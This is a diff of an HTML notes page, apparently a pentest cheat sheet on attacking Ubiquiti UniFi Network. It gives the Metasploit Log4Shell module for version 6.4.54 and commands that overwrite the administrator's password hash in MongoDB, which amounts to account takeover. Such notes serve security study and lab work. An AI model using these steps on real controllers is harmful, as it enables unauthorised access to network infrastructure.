@@ -24,26 +24,29 @@
         </div>
         <div class="notion-body">
             <h2>Usage</h2>
-            <h3> Remote connection </h3>
-            <p> Inside the control panel, the section SITE allows the administrator to configure a SSH server with the password in plain text</p>
+            <ul>
+                <h3> Remote connection </h3>
+                <p> Inside the control panel, the section SITE allows the administrator to configure a SSH server with the password in plain text</p>
 
-            <h3> Database </h3>
-            Unifi Network uses a MongoDB database in order to save user data, configurations and more. The port of that dabase may be (21117)
-
+                <h3> Database </h3>
+                Unifi Network uses a MongoDB database in order to save user data, configurations and more. The port of that dabase may be (21117)
+            </ul>
             <h2>Exploitation</h2>
-            <h3> Log4j </h3>
-            <p> The version 6.4.54 is affected by CVE-2021-44228 which can be easyly exploited using the following metasploit module  </p>
-            <pre><code class="language-bash"> use multi/http/ubiquiti_unifi_log4shell  </code></pre>
+            <ul>
+                <h3> Log4j </h3>
+                <p> The version 6.4.54 is affected by CVE-2021-44228 which can be easyly exploited using the following metasploit module  </p>
+                <pre><code class="language-bash"> use multi/http/ubiquiti_unifi_log4shell  </code></pre>
 
-            <h3> Generate and change users passwords</h3>
-            <p> Sice the password of all users are stored in the mongo database these ones can be modified with the appropiate permissions</p>
-            <h4> Generate password</h4>
-            <pre><code class="language-bash"> mkpasswd -m sha-512 Password1234  </code></pre>
-            <h4> Change password of user administrator</h4>
-            <pre><code class="language-mongodb"> db.admin.update(
- { name: "administrator" },
- { $set: { x_shadow: "$6$3yWpFhDlfbiknsNl$xppTy/2bfzQ.8oWy7HBtRImt9wte4H8EFc3YzlS3cmCjU9I75Q6PLegJxpRvQGLpTdIN/CtWvlI3zAQAO5aqH." } }
-)  </code></pre>
+                <h3> Generate and change users passwords</h3>
+                <p> Sice the password of all users are stored in the mongo database these ones can be modified with the appropiate permissions</p>
+                <h4> Generate password</h4>
+                <pre><code class="language-bash"> mkpasswd -m sha-512 Password1234  </code></pre>
+                <h4> Change password of user administrator</h4>
+                <pre><code class="language-mongodb"> db.admin.update(
+    { name: "administrator" },
+    { $set: { x_shadow: "$6$3yWpFhDlfbiknsNl$xppTy/2bfzQ.8oWy7HBtRImt9wte4H8EFc3YzlS3cmCjU9I75Q6PLegJxpRvQGLpTdIN/CtWvlI3zAQAO5aqH." } }
+    )  </code></pre>
+            </ul>        
 
             
 
